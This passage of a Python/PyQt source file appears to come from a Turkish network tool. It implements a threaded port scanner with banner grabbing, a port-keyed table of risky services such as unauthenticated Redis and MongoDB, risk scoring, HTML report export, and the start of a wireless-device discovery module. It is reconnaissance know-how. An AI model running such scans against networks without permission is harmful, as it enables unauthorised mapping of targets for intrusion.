    },
    5900: {
        'service': 'VNC',
        'risk': 'HIGH',
        'vulns': [
            {'name': 'VNC No Auth', 'severity': 'CRITICAL', 'desc': 'VNC şifresiz olabilir', 'check': 'noauth'},
            {'name': 'VNC Weak Password', 'severity': 'HIGH', 'desc': 'Zayıf VNC şifresi', 'check': 'weak'},
        ]
    },
    6379: {
        'service': 'Redis',
        'risk': 'CRITICAL',
        'vulns': [
            {'name': 'Redis No Auth', 'severity': 'CRITICAL', 'desc': 'Redis şifresiz!', 'check': 'noauth'},
            {'name': 'Redis RCE', 'severity': 'CRITICAL', 'desc': 'Uzaktan kod çalıştırma', 'cve': 'N/A'},
        ]
    },
    8080: {
        'service': 'HTTP-Proxy',
        'risk': 'MEDIUM',
        'vulns': [
            {'name': 'Open Proxy', 'severity': 'HIGH', 'desc': 'Açık proxy sunucu', 'check': 'proxy'},
            {'name': 'Tomcat Manager', 'severity': 'HIGH', 'desc': 'Tomcat manager açık', 'check': 'tomcat'},
        ]
    },
    27017: {
        'service': 'MongoDB',
        'risk': 'CRITICAL',
        'vulns': [
            {'name': 'MongoDB No Auth', 'severity': 'CRITICAL', 'desc': 'MongoDB şifresiz!', 'check': 'noauth'},
        ]
    },
}

# Risk renkleri
RISK_COLORS = {
    'CRITICAL': '#ff0000',
    'HIGH': '#ff6600',
    'MEDIUM': '#ffcc00',
    'LOW': '#00ff88',
    'INFO': '#00d4ff'
}

class VulnScanThread(QThread):
    """Zafiyet Tarama Thread"""
    progress_update = pyqtSignal(int, int, str)  # current, total, status
    vuln_found = pyqtSignal(dict)  # vulnerability data
    host_complete = pyqtSignal(dict)  # host scan complete
    scan_complete = pyqtSignal(list)  # all results
    
    def __init__(self, targets, port_range=None):
        super().__init__()
        self.targets = targets  # List of IPs
        self.port_range = port_range or [21,22,23,25,53,80,110,135,139,143,443,445,1433,1521,3306,3389,5432,5900,6379,8080,8443,27017]
        self.running = True
        self.results = []
    
    def stop(self):
        self.running = False
    
    def grab_banner(self, ip, port, timeout=2):
        """Port'tan banner al"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            
            # HTTP için özel istek
            if port in [80, 8080, 8443, 443]:
                sock.send(b"HEAD / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
            else:
                sock.send(b"\r\n")
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner[:200] if banner else None
        except:
            return None
    
    def check_port(self, ip, port, timeout=1):
        """Port açık mı kontrol et"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def analyze_vulnerabilities(self, ip, port, banner=None):
        """Port için zafiyetleri analiz et"""
        vulns = []
        
        if port in VULN_DATABASE:
            db_entry = VULN_DATABASE[port]
            service = db_entry['service']
            base_risk = db_entry['risk']
            
            for vuln in db_entry['vulns']:
                vuln_data = {
                    'ip': ip,
                    'port': port,
                    'service': service,
                    'name': vuln['name'],
                    'severity': vuln['severity'],
                    'description': vuln['desc'],
                    'cve': vuln.get('cve', 'N/A'),
                    'banner': banner,
                    'verified': False
                }
                
                # Banner bazlı doğrulama
                if banner:
                    banner_lower = banner.lower()
                    
                    # Versiyon tespiti
                    if 'openssh' in banner_lower:
                        vuln_data['version'] = banner.split()[0] if banner else ''
                    elif 'apache' in banner_lower:
                        vuln_data['version'] = banner
                    elif 'nginx' in banner_lower:
                        vuln_data['version'] = banner
                    elif 'microsoft' in banner_lower or 'iis' in banner_lower:
                        vuln_data['version'] = banner
                    
                    # Specific checks
                    if 'smbv1' in banner_lower and 'EternalBlue' in vuln['name']:
                        vuln_data['verified'] = True
                    if 'ssh-1' in banner_lower:
                        vuln_data['severity'] = 'CRITICAL'
                        vuln_data['verified'] = True
                
                vulns.append(vuln_data)
        else:
            # Bilinmeyen port - genel risk
            vulns.append({
                'ip': ip,
                'port': port,
                'service': f'Unknown ({port})',
                'name': 'Unknown Service',
                'severity': 'INFO',
                'description': 'Bilinmeyen servis, manuel kontrol gerekli',
                'cve': 'N/A',
                'banner': banner,
                'verified': False
            })
        
        return vulns
    
    def calculate_risk_score(self, vulns):
        """Risk skoru hesapla (0-100)"""
        if not vulns:
            return 100  # Zafiyet yok = güvenli
        
        score = 100
        severity_weights = {
            'CRITICAL': 25,
            'HIGH': 15,
            'MEDIUM': 8,
            'LOW': 3,
            'INFO': 1
        }
        
        for vuln in vulns:
            weight = severity_weights.get(vuln['severity'], 5)
            if vuln.get('verified'):
                weight *= 1.5  # Doğrulanmış zafiyetler daha ağır
            score -= weight
        
        return max(0, min(100, score))
    
    def run(self):
        total = len(self.targets)
        all_results = []
        
        for idx, ip in enumerate(self.targets):
            if not self.running:
                break
            
            self.progress_update.emit(idx + 1, total, f"Taranıyor: {ip}")
            
            host_result = {
                'ip': ip,
                'open_ports': [],
                'vulnerabilities': [],
                'risk_score': 100,
                'services': []
            }
            
            # Port tarama
            for port in self.port_range:
                if not self.running:
                    break
                
                if self.check_port(ip, port):
                    host_result['open_ports'].append(port)
                    
                    # Banner grab
                    banner = self.grab_banner(ip, port)
                    
                    # Zafiyet analizi
                    vulns = self.analyze_vulnerabilities(ip, port, banner)
                    host_result['vulnerabilities'].extend(vulns)
                    
                    # Servis ekle
                    service_name = VULN_DATABASE.get(port, {}).get('service', f'Port {port}')
                    host_result['services'].append({
                        'port': port,
                        'service': service_name,
                        'banner': banner
                    })
                    
                    # Her zafiyet için sinyal gönder
                    for vuln in vulns:
                        self.vuln_found.emit(vuln)
            
            # Risk skoru hesapla
            host_result['risk_score'] = self.calculate_risk_score(host_result['vulnerabilities'])
            
            all_results.append(host_result)
            self.host_complete.emit(host_result)
        
        self.results = all_results
        self.scan_complete.emit(all_results)


class VulnerabilityScannerWidget(QWidget):
    """Zafiyet Tarama Arayüzü"""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.scan_thread = None
        self.results = []
        self.setup_ui()
    
    def setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(10)
        
        # === HEADER ===
        header = QLabel("🔓 ZAFİYET TARAMA (Vulnerability Scanner)")
        header.setStyleSheet("""
            QLabel{
                background: qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #1a0a0a,stop:0.5 #2a1a1a,stop:1 #1a0a0a);
                color: #ff6600;
                font-size: 18px;
                font-weight: bold;
                padding: 15px;
                border: 2px solid #ff6600;
                border-radius: 10px;
            }
        """)
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(header)
        
        # === KONTROL PANELİ ===
        control_frame = QFrame()
        control_frame.setStyleSheet("QFrame{background:#16213e;border-radius:10px;padding:10px;}")
        control_layout = QHBoxLayout(control_frame)
        
        # Hedef girişi
        control_layout.addWidget(QLabel("🎯 Hedef:"))
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("IP veya aralık (örn: 192.168.1.1 veya 192.168.1.1-50)")
        self.target_input.setStyleSheet("QLineEdit{background:#0a0a14;color:#00ff88;border:1px solid #00ff88;border-radius:6px;padding:8px;min-width:250px;}")
        control_layout.addWidget(self.target_input)
        
        # Tarama tipi
        control_layout.addWidget(QLabel("📋 Tip:"))
        self.scan_type = QComboBox()
        self.scan_type.addItems(["Hızlı (Top 20)", "Normal (Top 100)", "Tam (Tüm Portlar)"])
        self.scan_type.setStyleSheet("QComboBox{background:#0a0a14;color:white;padding:8px;border-radius:6px;}")
        control_layout.addWidget(self.scan_type)
        
        # Başlat butonu
        self.scan_btn = QPushButton("🔍 TARAMA BAŞLAT")
        self.scan_btn.setStyleSheet("""
            QPushButton{background:#ff6600;color:white;padding:12px 25px;border:none;border-radius:8px;font-weight:bold;font-size:13px;}
            QPushButton:hover{background:#ff8800;}
            QPushButton:disabled{background:#444;color:#888;}
        """)
        self.scan_btn.clicked.connect(self.start_scan)
        control_layout.addWidget(self.scan_btn)
        
        # Durdur butonu
        self.stop_btn = QPushButton("⏹ Durdur")
        self.stop_btn.setStyleSheet("QPushButton{background:#e74c3c;color:white;padding:12px 15px;border:none;border-radius:8px;font-weight:bold;}")
        self.stop_btn.clicked.connect(self.stop_scan)
        self.stop_btn.setEnabled(False)
        control_layout.addWidget(self.stop_btn)
        
        layout.addWidget(control_frame)
        
        # === PROGRESS ===
        progress_frame = QFrame()
        progress_frame.setStyleSheet("QFrame{background:#0a0a14;border-radius:8px;padding:8px;}")
        progress_layout = QHBoxLayout(progress_frame)
        
        self.progress = QProgressBar()
        self.progress.setStyleSheet("""
            QProgressBar{background:#1a1a2e;border:1px solid #ff6600;border-radius:6px;height:25px;text-align:center;color:white;font-weight:bold;}
            QProgressBar::chunk{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #ff6600,stop:1 #ff8800);border-radius:5px;}
        """)
        progress_layout.addWidget(self.progress)
        
        self.status_label = QLabel("⏳ Hazır")
        self.status_label.setStyleSheet("color:#888;font-size:11px;min-width:200px;")
        progress_layout.addWidget(self.status_label)
        
        layout.addWidget(progress_frame)
        
        # === ÖZET KARTLARI ===
        summary_frame = QFrame()
        summary_frame.setStyleSheet("QFrame{background:#16213e;border-radius:10px;padding:10px;}")
        summary_layout = QHBoxLayout(summary_frame)
        
        self.summary_cards = {}
        card_data = [
            ('hosts', '🖥️ Tarandı', '0', '#00d4ff'),
            ('open_ports', '🔓 Açık Port', '0', '#f39c12'),
            ('critical', '🚨 Kritik', '0', '#ff0000'),
            ('high', '⚠️ Yüksek', '0', '#ff6600'),
            ('medium', '⚡ Orta', '0', '#ffcc00'),
            ('low', '✅ Düşük', '0', '#00ff88'),
            ('score', '📊 Risk Skoru', '100', '#00ff88'),
        ]
        
        for key, title, value, color in card_data:
            card = QFrame()
            card.setStyleSheet(f"QFrame{{background:#0a0a14;border:2px solid {color};border-radius:8px;padding:8px;}}")
            card_layout = QVBoxLayout(card)
            card_layout.setSpacing(2)
            
            title_lbl = QLabel(title)
            title_lbl.setStyleSheet(f"color:{color};font-size:10px;")
            title_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
            card_layout.addWidget(title_lbl)
            
            value_lbl = QLabel(value)
            value_lbl.setStyleSheet(f"color:{color};font-size:20px;font-weight:bold;")
            value_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
            card_layout.addWidget(value_lbl)
            
            self.summary_cards[key] = value_lbl
            summary_layout.addWidget(card)
        
        layout.addWidget(summary_frame)
        
        # === ANA İÇERİK (Splitter) ===
        splitter = QSplitter(Qt.Orientation.Horizontal)
        
        # Sol: Host listesi
        left_panel = QFrame()
        left_panel.setStyleSheet("QFrame{background:#0a0a14;border-radius:8px;}")
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(8, 8, 8, 8)
        
        left_header = QLabel("🖥️ TARANAN HOSTLAR")
        left_header.setStyleSheet("color:#00d4ff;font-weight:bold;font-size:12px;padding:5px;background:#16213e;border-radius:4px;")
        left_layout.addWidget(left_header)
        
        self.host_list = QListWidget()
        self.host_list.setStyleSheet("""
            QListWidget{background:#0a0a14;border:1px solid #0f3460;border-radius:6px;font-size:11px;}
            QListWidget::item{padding:10px;border-bottom:1px solid #16213e;}
            QListWidget::item:selected{background:#16213e;border-left:3px solid #ff6600;}
        """)
        self.host_list.itemClicked.connect(self.on_host_selected)
        left_layout.addWidget(self.host_list)
        
        splitter.addWidget(left_panel)
        
        # Sağ: Zafiyet detayları
        right_panel = QFrame()
        right_panel.setStyleSheet("QFrame{background:#0a0a14;border-radius:8px;}")
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(8, 8, 8, 8)
        
        right_header = QLabel("🔓 ZAFİYET DETAYLARI")
        right_header.setStyleSheet("color:#ff6600;font-weight:bold;font-size:12px;padding:5px;background:#16213e;border-radius:4px;")
        right_layout.addWidget(right_header)
        
        # Zafiyet tablosu
        self.vuln_table = QTableWidget()
        self.vuln_table.setColumnCount(7)
        self.vuln_table.setHorizontalHeaderLabels(["Risk", "Port", "Servis", "Zafiyet", "CVE", "Açıklama", "Doğrulandı"])
        self.vuln_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
        self.vuln_table.horizontalHeader().setStretchLastSection(True)
        self.vuln_table.horizontalHeader().resizeSection(0, 60)
        self.vuln_table.horizontalHeader().resizeSection(1, 50)
        self.vuln_table.horizontalHeader().resizeSection(2, 80)
        self.vuln_table.horizontalHeader().resizeSection(3, 150)
        self.vuln_table.horizontalHeader().resizeSection(4, 100)
        self.vuln_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.vuln_table.setStyleSheet("""
            QTableWidget{background:#0a0a14;border:1px solid #0f3460;font-size:10px;color:white;}
            QHeaderView::section{background:#16213e;color:#ff6600;padding:6px;font-weight:bold;border:none;}
            QTableWidget::item{padding:5px;}
            QTableWidget::item:selected{background:#2a1a1a;}
        """)
        right_layout.addWidget(self.vuln_table)
        
        # Banner/Detay gösterimi
        detail_header = QLabel("📋 SERVİS DETAYI")
        detail_header.setStyleSheet("color:#00ff88;font-weight:bold;font-size:11px;margin-top:10px;")
        right_layout.addWidget(detail_header)
        
        self.detail_text = QTextEdit()
        self.detail_text.setReadOnly(True)
        self.detail_text.setMaximumHeight(100)
        self.detail_text.setStyleSheet("QTextEdit{background:#16213e;color:#00ff88;border:1px solid #0f3460;border-radius:6px;font-family:Consolas;font-size:10px;}")
        right_layout.addWidget(self.detail_text)
        
        splitter.addWidget(right_panel)
        splitter.setSizes([300, 700])
        
        layout.addWidget(splitter, 1)
        
        # === ALT BUTONLAR ===
        bottom_layout = QHBoxLayout()
        
        export_btn = QPushButton("📄 Rapor Oluştur")
        export_btn.setStyleSheet("QPushButton{background:#0f3460;color:white;padding:10px 20px;border:1px solid #00d4ff;border-radius:6px;}QPushButton:hover{background:#16213e;}")
        export_btn.clicked.connect(self.export_report)
        bottom_layout.addWidget(export_btn)
        
        bottom_layout.addStretch()
        
        clear_btn = QPushButton("🗑️ Temizle")
        clear_btn.setStyleSheet("QPushButton{background:#e74c3c;color:white;padding:10px 20px;border:none;border-radius:6px;}QPushButton:hover{background:#c0392b;}")
        clear_btn.clicked.connect(self.clear_results)
        bottom_layout.addWidget(clear_btn)
        
        layout.addLayout(bottom_layout)
    
    def parse_targets(self, target_str):
        """Hedef string'i IP listesine çevir"""
        targets = []
        target_str = target_str.strip()
        
        if not target_str:
            # Mevcut subnet'i tara
            subnet = get_subnet()
            return [f"{subnet}.{i}" for i in range(1, 255)]
        
        if '-' in target_str and not target_str.count('.') == 3:
            # Aralık: 192.168.1.1-50
            parts = target_str.rsplit('.', 1)
            if len(parts) == 2:
                base = parts[0]
                range_part = parts[1]
                if '-' in range_part:
                    start, end = range_part.split('-')
                    for i in range(int(start), int(end) + 1):
                        targets.append(f"{base}.{i}")
        elif '/' in target_str:
            # CIDR: 192.168.1.0/24
            try:
                import ipaddress
                network = ipaddress.ip_network(target_str, strict=False)
                targets = [str(ip) for ip in network.hosts()]
            except:
                targets = [target_str]
        elif ',' in target_str:
            # Virgülle ayrılmış
            targets = [t.strip() for t in target_str.split(',')]
        else:
            # Tek IP
            targets = [target_str]
        
        return targets[:255]  # Max 255 host
    
    def get_port_range(self):
        """Seçilen tarama tipine göre port listesi"""
        scan_idx = self.scan_type.currentIndex()
        
        if scan_idx == 0:  # Hızlı
            return [21,22,23,25,80,110,139,443,445,3389,5900,8080]
        elif scan_idx == 1:  # Normal
            return [20,21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,27017]
        else:  # Tam
            return list(range(1, 1025)) + [1433,1521,3306,3389,5432,5900,6379,8080,8443,27017]
    
    def start_scan(self):
        """Taramayı başlat"""
        targets = self.parse_targets(self.target_input.text())
        
        if not targets:
            QMessageBox.warning(self, "Uyarı", "Hedef IP girilmedi!")
            return
        
        self.clear_results()
        
        self.scan_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.progress.setMaximum(len(targets))
        self.progress.setValue(0)
        
        port_range = self.get_port_range()
        
        self.scan_thread = VulnScanThread(targets, port_range)
        self.scan_thread.progress_update.connect(self.on_progress)
        self.scan_thread.vuln_found.connect(self.on_vuln_found)
        self.scan_thread.host_complete.connect(self.on_host_complete)
        self.scan_thread.scan_complete.connect(self.on_scan_complete)
        self.scan_thread.start()
    
    def stop_scan(self):
        """Taramayı durdur"""
        if self.scan_thread:
            self.scan_thread.stop()
            self.status_label.setText("⏹ Tarama durduruldu")
        self.scan_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
    
    def on_progress(self, current, total, status):
        """İlerleme güncellemesi"""
        self.progress.setValue(current)
        self.status_label.setText(status)
    
    def on_vuln_found(self, vuln):
        """Zafiyet bulunduğunda"""
        # İstatistikleri güncelle
        severity = vuln['severity']
        if severity == 'CRITICAL':
            val = int(self.summary_cards['critical'].text()) + 1
            self.summary_cards['critical'].setText(str(val))
        elif severity == 'HIGH':
            val = int(self.summary_cards['high'].text()) + 1
            self.summary_cards['high'].setText(str(val))
        elif severity == 'MEDIUM':
            val = int(self.summary_cards['medium'].text()) + 1
            self.summary_cards['medium'].setText(str(val))
        elif severity == 'LOW':
            val = int(self.summary_cards['low'].text()) + 1
            self.summary_cards['low'].setText(str(val))
    
    def on_host_complete(self, result):
        """Host taraması tamamlandığında"""
        self.results.append(result)
        
        # Host listesine ekle
        ip = result['ip']
        score = result['risk_score']
        port_count = len(result['open_ports'])
        vuln_count = len(result['vulnerabilities'])
        
        # Risk rengini belirle
        if score >= 80:
            color = '#00ff88'
            risk_text = '✅'
        elif score >= 60:
            color = '#ffcc00'
            risk_text = '⚡'
        elif score >= 40:
            color = '#ff6600'
            risk_text = '⚠️'
        else:
            color = '#ff0000'
            risk_text = '🚨'
        
        item = QListWidgetItem(f"{risk_text} {ip}  |  {port_count} port  |  Risk: {score}")
        item.setData(Qt.ItemDataRole.UserRole, ip)
        item.setForeground(QColor(color))
        self.host_list.addItem(item)
        
        # İstatistikleri güncelle
        self.summary_cards['hosts'].setText(str(len(self.results)))
        total_ports = sum(len(r['open_ports']) for r in self.results)
        self.summary_cards['open_ports'].setText(str(total_ports))
        
        # Ortalama risk skoru
        avg_score = sum(r['risk_score'] for r in self.results) // len(self.results)
        self.summary_cards['score'].setText(str(avg_score))
        
        # Skor rengini güncelle
        if avg_score >= 80:
            self.summary_cards['score'].setStyleSheet("color:#00ff88;font-size:20px;font-weight:bold;")
        elif avg_score >= 60:
            self.summary_cards['score'].setStyleSheet("color:#ffcc00;font-size:20px;font-weight:bold;")
        elif avg_score >= 40:
            self.summary_cards['score'].setStyleSheet("color:#ff6600;font-size:20px;font-weight:bold;")
        else:
            self.summary_cards['score'].setStyleSheet("color:#ff0000;font-size:20px;font-weight:bold;")
    
    def on_scan_complete(self, results):
        """Tarama tamamlandığında"""
        self.scan_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_label.setText(f"✅ Tarama tamamlandı - {len(results)} host tarandı")
        
        # İlk host'u seç
        if self.host_list.count() > 0:
            self.host_list.setCurrentRow(0)
            self.on_host_selected(self.host_list.item(0))
    
    def on_host_selected(self, item):
        """Host seçildiğinde zafiyetlerini göster"""
        if not item:
            return
        
        ip = item.data(Qt.ItemDataRole.UserRole)
        result = next((r for r in self.results if r['ip'] == ip), None)
        
        if not result:
            return
        
        # Zafiyet tablosunu doldur
        self.vuln_table.setRowCount(0)
        
        for vuln in result['vulnerabilities']:
            row = self.vuln_table.rowCount()
            self.vuln_table.insertRow(row)
            
            # Risk
            severity = vuln['severity']
            risk_item = QTableWidgetItem(severity)
            risk_item.setForeground(QColor(RISK_COLORS.get(severity, '#888')))
            risk_item.setBackground(QColor('#1a0a0a') if severity in ['CRITICAL', 'HIGH'] else QColor('#0a0a14'))
            self.vuln_table.setItem(row, 0, risk_item)
            
            # Port
            self.vuln_table.setItem(row, 1, QTableWidgetItem(str(vuln['port'])))
            
            # Servis
            service_item = QTableWidgetItem(vuln['service'])
            service_item.setForeground(QColor('#00d4ff'))
            self.vuln_table.setItem(row, 2, service_item)
            
            # Zafiyet adı
            name_item = QTableWidgetItem(vuln['name'])
            name_item.setForeground(QColor(RISK_COLORS.get(severity, '#888')))
            self.vuln_table.setItem(row, 3, name_item)
            
            # CVE
            cve_item = QTableWidgetItem(vuln['cve'])
            if vuln['cve'] != 'N/A':
                cve_item.setForeground(QColor('#ff6600'))
            self.vuln_table.setItem(row, 4, cve_item)
            
            # Açıklama
            self.vuln_table.setItem(row, 5, QTableWidgetItem(vuln['description']))
            
            # Doğrulandı
            verified_item = QTableWidgetItem('✅' if vuln.get('verified') else '❓')
            verified_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            self.vuln_table.setItem(row, 6, verified_item)
        
        # Detay alanını güncelle
        detail_text = f"🖥️ Host: {ip}\n"
        detail_text += f"📊 Risk Skoru: {result['risk_score']}/100\n"
        detail_text += f"🔓 Açık Portlar: {', '.join(map(str, result['open_ports']))}\n\n"
        
        for svc in result['services']:
            if svc['banner']:
                detail_text += f"[Port {svc['port']}] {svc['service']}\n"
                detail_text += f"  Banner: {svc['banner'][:100]}\n\n"
        
        self.detail_text.setText(detail_text)
    
    def clear_results(self):
        """Sonuçları temizle"""
        self.results = []
        self.host_list.clear()
        self.vuln_table.setRowCount(0)
        self.detail_text.clear()
        self.progress.setValue(0)
        
        # İstatistikleri sıfırla
        for key in self.summary_cards:
            if key == 'score':
                self.summary_cards[key].setText('100')
                self.summary_cards[key].setStyleSheet("color:#00ff88;font-size:20px;font-weight:bold;")
            else:
                self.summary_cards[key].setText('0')
    
    def export_report(self):
        """Rapor oluştur"""
        if not self.results:
            QMessageBox.warning(self, "Uyarı", "Önce tarama yapın!")
            return
        
        path, _ = QFileDialog.getSaveFileName(self, "Rapor Kaydet", "vuln_report.html", "HTML (*.html)")
        if not path:
            return
        
        # HTML rapor oluştur
        html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>MotunNet Zafiyet Raporu</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a2e; color: white; padding: 20px; }
        h1 { color: #ff6600; border-bottom: 2px solid #ff6600; padding-bottom: 10px; }
        h2 { color: #00d4ff; margin-top: 30px; }
        table { border-collapse: collapse; width: 100%; margin: 10px 0; }
        th, td { border: 1px solid #0f3460; padding: 10px; text-align: left; }
        th { background: #16213e; color: #00ff88; }
        .critical { color: #ff0000; font-weight: bold; }
        .high { color: #ff6600; font-weight: bold; }
        .medium { color: #ffcc00; }
        .low { color: #00ff88; }
        .summary { display: flex; gap: 20px; margin: 20px 0; }
        .card { background: #16213e; padding: 15px; border-radius: 8px; text-align: center; }
        .card-value { font-size: 24px; font-weight: bold; }
    </style>
</head>
<body>
    <h1>🔓 MotunNet Zafiyet Tarama Raporu</h1>
    <p>Tarih: """ + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + """</p>
    
    <div class="summary">
        <div class="card"><div>Taranan Host</div><div class="card-value">""" + str(len(self.results)) + """</div></div>
        <div class="card"><div>Toplam Açık Port</div><div class="card-value">""" + str(sum(len(r['open_ports']) for r in self.results)) + """</div></div>
        <div class="card"><div>Ortalama Risk Skoru</div><div class="card-value">""" + str(sum(r['risk_score'] for r in self.results) // max(1, len(self.results))) + """/100</div></div>
    </div>
"""
        
        for result in self.results:
            html += f"""
    <h2>🖥️ {result['ip']} - Risk Skoru: {result['risk_score']}/100</h2>
    <p>Açık Portlar: {', '.join(map(str, result['open_ports']))}</p>
    <table>
        <tr><th>Risk</th><th>Port</th><th>Servis</th><th>Zafiyet</th><th>CVE</th><th>Açıklama</th></tr>
"""
            for vuln in result['vulnerabilities']:
                css_class = vuln['severity'].lower()
                html += f"""        <tr>
            <td class="{css_class}">{vuln['severity']}</td>
            <td>{vuln['port']}</td>
            <td>{vuln['service']}</td>
            <td>{vuln['name']}</td>
            <td>{vuln['cve']}</td>
            <td>{vuln['description']}</td>
        </tr>
"""
            html += "    </table>\n"
        
        html += """
</body>
</html>"""
        
        with open(path, 'w', encoding='utf-8') as f:
            f.write(html)
        
        QMessageBox.information(self, "Başarılı", f"Rapor kaydedildi:\n{path}")


# ===============================
# ANTEN TESPİT MODÜLÜ
# ===============================

@dataclass
class AntennaDevice:
    """Tespit edilen anten/kablosuz cihaz bilgisi"""
    ip: str = ""
    mac: str = ""
    name: str = ""
    model: str = ""
    vendor: str = ""
    device_type: str = "unknown"  # antenna, bridge, ap, router, repeater
    protocol: str = ""  # SSDP, UBNT, MIKROTIK, CDP, LLDP, TINAX
    firmware: str = ""
    signal_strength: int = 0
    frequency: str = ""  # 900MHz, 2.4GHz, 5GHz
    uptime: str = ""
    status: str = "online"
    last_seen: str = ""
    raw_data: dict = field(default_factory=dict)
    
    def to_dict(self):
        return asdict(self)

# Kablosuz cihaz üreticileri (MAC prefix -> vendor)
WIRELESS_VENDORS = {
    "00:15:6D": ("Ubiquiti", "antenna"), "04:18:D6": ("Ubiquiti", "antenna"),
    "24:A4:3C": ("Ubiquiti", "antenna"), "44:D9:E7": ("Ubiquiti", "antenna"),
    "68:72:51": ("Ubiquiti", "antenna"), "74:83:C2": ("Ubiquiti", "antenna"),
    "78:8A:20": ("Ubiquiti", "antenna"), "80:2A:A8": ("Ubiquiti", "antenna"),
    "B4:FB:E4": ("Ubiquiti", "antenna"), "DC:9F:DB": ("Ubiquiti", "antenna"),
    "E0:63:DA": ("Ubiquiti", "antenna"), "F0:9F:C2": ("Ubiquiti", "antenna"),
    "FC:EC:DA": ("Ubiquiti", "antenna"),
    "00:0C:42": ("Mikrotik", "router"), "2C:C8:1B": ("Mikrotik", "router"),
    "4C:5E:0C": ("Mikrotik", "router"), "64:D1:54": ("Mikrotik", "router"),
    "6C:3B:6B": ("Mikrotik", "router"), "74:4D:28": ("Mikrotik", "router"),
    "B8:69:F4": ("Mikrotik", "router"), "C4:AD:34": ("Mikrotik", "router"),
    "CC:2D:E0": ("Mikrotik", "router"), "D4:CA:6D": ("Mikrotik", "router"),
    "E4:8D:8C": ("Mikrotik", "router"),
    "34:53:02": ("Tinax", "bridge"), "36:C2:02": ("Tinax", "bridge"),
    "36:D8:02": ("Tinax", "bridge"), "41:C2:02": ("Tinax", "bridge"),
    "4C:59:01": ("Tinax", "bridge"), "4D:EE:01": ("Tinax", "bridge"),
    "60:3D:04": ("Tinax", "bridge"), "71:2D:06": ("Tinax", "bridge"),
    "72:46:06": ("Tinax", "bridge"),
    "00:1A:2B": ("Cambium", "antenna"), "58:C1:7A": ("Cambium", "antenna"),
    "00:27:22": ("Cambium", "antenna"),
    "00:0B:6B": ("Proxim", "bridge"), "00:20:D8": ("Proxim", "bridge"),
    "00:09:5B": ("Netgear", "ap"), "00:14:6C": ("Netgear", "ap"),
    "00:1E:2A": ("Netgear", "ap"), "00:1F:33": ("Netgear", "ap"),
    "00:18:E7": ("Aruba", "ap"), "00:0B:86": ("Aruba", "ap"),
    "24:DE:C6": ("Aruba", "ap"), "D8:C7:C8": ("Aruba", "ap"),
    "00:17:DF": ("Cisco", "ap"), "00:1B:2A": ("Cisco", "ap"),
    "00:24:14": ("Cisco", "ap"), "00:40:96": ("Cisco", "ap"),
    "00:26:99": ("Cisco", "ap"), "5C:50:15": ("Cisco", "ap"),
    "00:25:84": ("TP-Link", "ap"), "14:CC:20": ("TP-Link", "ap"),
    "50:C7:BF": ("TP-Link", "ap"), "E8:DE:27": ("TP-Link", "ap"),
    "00:1D:7E": ("Linksys", "router"), "00:22:6B": ("Linksys", "router"),
    "00:23:69": ("Linksys", "router"), "C0:C1:C0": ("Linksys", "router"),
    "00:24:B2": ("Ruckus", "ap"), "74:91:1A": ("Ruckus", "ap"),
    "EC:8C:A2": ("Ruckus", "ap"), "08:86:3B": ("Ruckus", "ap"),
    "00:1C:B3": ("Apple", "ap"), "28:6A:BA": ("Apple", "ap"),
    "34:12:98": ("Apple", "ap"), "70:56:81": ("Apple", "ap"),
    "00:A0:C9": ("Intel", "wireless"), "00:13:02": ("Intel", "wireless"),
    "00:15:00": ("Intel", "wireless"), "00:21:5C": ("Intel", "wireless"),
}

class AntennaDiscoveryThread(QThread):
    """Kablosuz cihaz keşif thread'i"""
    device_found = pyqtSignal(object)
    progress = pyqtSignal(str)
    finished_signal = pyqtSignal(int)
    
    def __init__(self, ip_range="", timeout=2):
        super().__init__()
        self.ip_range = ip_range
        self.timeout = timeout
        self._stop = False
        self.found_devices = {}
        
    def stop(self):
        self._stop = True
        
    def run(self):
        self._stop = False
        self.found_devices = {}
        count = 0
        
        try:
            # 1. SSDP Discovery (UPnP cihazları)
            self.progress.emit("🔍 SSDP taranıyor (UDP 1900)...")
            count += self.scan_ssdp()
            
            # 2. Ubiquiti Discovery
            self.progress.emit("📡 Ubiquiti cihazları taranıyor (UDP 10001)...")
            count += self.scan_ubiquiti()
            
            # 3. Mikrotik Discovery
            self.progress.emit("🌐 Mikrotik cihazları taranıyor (UDP 5678)...")
            count += self.scan_mikrotik()
            
            # 4. Tinax Discovery (6239 port)
            self.progress.emit("📶 Tinax antenleri taranıyor (UDP 6239)...")
            count += self.scan_tinax()
            
            # 5. IP aralığı tarama (HTTP/HTTPS web arayüzü)
            if self.ip_range:
                self.progress.emit(f"🔎 IP taraması: {self.ip_range}...")
                count += self.scan_ip_range()
            
            # 6. ARP tablosundan MAC vendor kontrolü
            self.progress.emit("📋 ARP tablosu analizi...")
            count += self.scan_arp_table()
            
        except Exception as e:
            self.progress.emit(f"❌ Hata: {str(e)}")
        
        self.finished_signal.emit(len(self.found_devices))
